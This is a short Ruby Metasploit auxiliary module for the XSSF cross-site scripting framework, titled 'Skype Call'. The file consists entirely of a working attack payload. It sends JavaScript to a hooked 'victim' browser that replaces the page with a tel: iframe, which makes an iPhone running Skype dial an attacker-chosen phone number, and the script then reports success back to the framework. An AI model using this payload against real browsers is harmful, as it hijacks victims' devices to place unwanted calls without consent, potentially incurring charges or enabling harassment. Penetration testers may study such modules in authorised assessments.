require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Skype Call',
			'Description' => 'This module permits to launch a phone call on IPhone Skype'
		))
		
		register_options(
			[
				OptString.new('phoneNumber', [true, 'Phone number to call', 0601020304])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			document.body.innerHTML = "<iframe src=tel:#{datastore['phoneNumber']}></iframe>";
			XSSF_POST("Phone call launched",'#{self.name}');
		}
		
		send_response(cli, code)
	end
end